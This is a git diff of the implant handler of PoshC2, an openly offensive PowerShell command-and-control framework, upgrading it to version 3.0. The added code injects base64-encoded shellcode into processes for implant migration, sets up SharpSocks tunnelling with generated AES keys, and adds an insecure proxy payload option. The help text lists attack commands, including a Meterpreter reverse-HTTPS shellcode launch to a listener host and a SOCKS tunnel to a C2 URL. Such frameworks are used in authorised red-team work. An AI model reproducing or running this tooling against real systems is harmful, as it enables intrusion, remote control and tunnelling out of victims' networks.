@@ -45,6 +45,8 @@ function Implant-Handler
     $ipv4address = $c2serverresults.HostnameIP
     $serverport = $c2serverresults.ServerPort
     $URLS =  $c2serverresults.URLS
+    $SocksURLS =  $c2serverresults.SocksURLS
+    $Insecure =  $c2serverresults.Insecure
     $useragent =  $c2serverresults.UserAgent
     $Host.ui.RawUI.WindowTitle = "PoshC2 Implant Handler: $ipv4address Port $serverport"
         
@@ -116,7 +118,7 @@ $header = '
             Write-Host -Object "|   |  Y Y  \  |_> >  |__/ __ \|   |  \  |  \___ \ " -ForegroundColor Green
             Write-Host -Object "|___|__|_|  /   __/|____(____  /___|  /__| /____  >" -ForegroundColor Green
             Write-Host -Object "          \/|__|             \/     \/          \/ " -ForegroundColor Green
-            Write-Host "============== v2.15 www.PoshC2.co.uk =============" -ForegroundColor Green
+            Write-Host "============== v3.0 www.PoshC2.co.uk =============" -ForegroundColor Green
             Write-Host ""
             foreach ($implant in $dbresults) 
             { 
@@ -178,47 +180,35 @@ $header = '
                 Invoke-SqliteQuery -DataSource $Database -Query "UPDATE C2Server SET DefaultSleep='$Beacon'"|Out-Null
                 startup
             }
-            elseif ($global:implantid -eq "automigrate-frompowershell")
+            elseif (($global:implantid -eq "automigrate-frompowershell") -or ($global:implantid -eq "AM"))
             {
-                $taskn = "LoadModule NamedPipe.ps1"
-                $taskp = "LoadModule Invoke-ReflectivePEInjection.ps1"
-                $taskm = "AutoMigrate"
-                $Query = 'INSERT
-                INTO AutoRuns (Task)
-                VALUES (@Task)'
+                if (Test-Path "$FolderPath\payloads\Posh-shellcode_x86.bin"){
+                    $bytes = (Get-Content "$FolderPath\payloads\Posh-shellcode_x86.bin" -Encoding Byte)
+                    $base64 = [System.Convert]::ToBase64String($bytes)   
+                    $bytes_64 = (Get-Content "$FolderPath\payloads\Posh-shellcode_x64.bin" -Encoding Byte)
+                    $base64_64 = [System.Convert]::ToBase64String($bytes_64)                 
+                    $taskn = "LoadModule Inject-Shellcode.ps1"
+                    $taskp = "`$Shellcode86 = `"$base64`";`$Shellcode64 = `"$base64_64`""
+                    $taskm = "AutoMigrate"
+                    $Query = 'INSERT
+                    INTO AutoRuns (Task)
+                    VALUES (@Task)'
                 
-                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
-                Task = $taskn
+                    Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
+                    Task = $taskn
+                    }
+                    Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
+                    Task = $taskp
+                    }
+                    Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
+                    Task = $taskm
+                    }
+                    $HelpOutput = "Added automigrate-frompowershell"
+                    startup
+                } else {
+                   $HelpOutput = "Error cannot find shellcode"
+                    startup   
                 }
-                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
-                Task = $taskp
-                }
-                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
-                Task = $taskm
-                }
-                $HelpOutput = "Added automigrate-frompowershell"
-                startup      
-            }
-            elseif ($global:implantid -eq "AM")
-            {
-                $taskn = "LoadModule NamedPipe.ps1"
-                $taskp = "LoadModule Invoke-ReflectivePEInjection.ps1"
-                $taskm = "AutoMigrate"
-                $Query = 'INSERT
-                INTO AutoRuns (Task)
-                VALUES (@Task)'
-                
-                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
-                Task = $taskn
-                }
-                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
-                Task = $taskp
-                }
-                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
-                Task = $taskm
-                }
-                $HelpOutput = "Added automigrate-frompowershell"
-                startup      
             }
             elseif ($global:implantid -eq "L") 
             {
@@ -626,6 +616,7 @@ $header = '
         write-host " Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 172.16.0.100 -Lport 443 -Force" -ForegroundColor Green
         write-host ' Get-Eventlog -newest 10000 -instanceid 4624 -logname security | select message -ExpandProperty message | select-string -pattern "user1|user2|user3"' -ForegroundColor Green
         write-host ' Send-MailMessage -to "itdept@test.com" -from "User01 <user01@example.com>" -subject <> -smtpServer <> -Attachment <>'-ForegroundColor Green
+        write-host ' SharpSocks -Uri http://www.c2.com:9090 -Beacon 2000 -Insecure' -ForegroundColor Green
         write-host `n "Implant Handler: " -ForegroundColor Green
         write-host "=====================" -ForegroundColor Red
         write-host " Back" -ForegroundColor Green 
@@ -674,15 +665,55 @@ primer | iex }'
         return $result
     }
     
+    # creates a randon AES symetric encryption key
+    function Create-AesManagedObject 
+    {
+        param
+        (
+            [Object]
+            $key,
+            [Object]
+            $IV
+        )
+
+        $aesManaged = New-Object -TypeName 'System.Security.Cryptography.RijndaelManaged'
+        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+        $aesManaged.BlockSize = 128
+        $aesManaged.KeySize = 256
+        if ($IV) 
+        {
+            if ($IV.getType().Name -eq 'String') 
+            {$aesManaged.IV = [System.Convert]::FromBase64String($IV)}
+            else 
+            {$aesManaged.IV = $IV}
+        }
+        if ($key) 
+        {
+            if ($key.getType().Name -eq 'String') 
+            {$aesManaged.Key = [System.Convert]::FromBase64String($key)}
+            else 
+            {$aesManaged.Key = $key}
+        }
+        $aesManaged
+    }
+
+    # creates a randon AES symetric encryption key
+    function Create-AesKey() 
+    {
+        $aesManaged = Create-AesManagedObject
+        $aesManaged.GenerateKey()
+        [System.Convert]::ToBase64String($aesManaged.Key)
+    }
     function PatchDll {
         param($dllBytes, $replaceString, $Arch)
 
         if ($Arch -eq 'x86') {
             $dllOffset = 0x00012D80
-            #$dllOffset = $dllOffset +8
+            #$dllOffset = 0x00012ED0 +8
         }
         if ($Arch -eq 'x64') {
-            $dllOffset = 0x00016F00
+            $dllOffset = 0x00017100
         }
 
         # Patch DLL - replace 5000 A's
@@ -718,8 +749,13 @@ function CreateProxyPayload
         [Parameter(Mandatory=$true)][AllowEmptyString()][string]$username,
         [Parameter(Mandatory=$true)][AllowEmptyString()][string]$password,
         [Parameter(Mandatory=$true)][string]$proxyurl
-    )        
-    $command = createdropper -Proxy -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -username $username -password $password -proxyurl $proxyurl
+    )
+    if ($Insecure -eq "Yes") {
+        $command = createdropper -Proxy -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -username $username -password $password -proxyurl $proxyurl -Insecure
+    } else {
+        $command = createdropper -Proxy -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -username $username -password $password -proxyurl $proxyurl
+    }
+            
     $payload = createrawpayload -command $command
     # create proxy payloads
     CreatePayload -Proxy 1
@@ -1767,6 +1803,15 @@ param
             if ($pscommand.tolower().startswith('get-computerinfo'))
             {
                 CheckModuleLoaded "Get-ComputerInfo.ps1" $psrandomuri
+            }
+            if ($pscommand.tolower().startswith('sharpsocks'))
+            {
+                CheckModuleLoaded "sharpsocks.ps1" $psrandomuri
+                $Key = Create-AesKey
+                $Channel = Get-RandomURI -Length 25
+                $IP = Read-Host "Local IP Address to bind to, e.g. http://172.16.0.1:80" 
+                start-process "powershell" -ArgumentList "-exec bypass -noexit -c import-module $($PoshPath)\Modules\SharpSocks.ps1; SharpSocks -Server -Channel $Channel -Key $Key -Uri $IP" -WindowStyle Minimized
+                $pscommand = "$($pscommand) -Client -Channel $Channel -Key $Key -URLs $SocksURLs"
             }
             if ($pscommand.tolower().startswith('invoke-enum')) 
             {
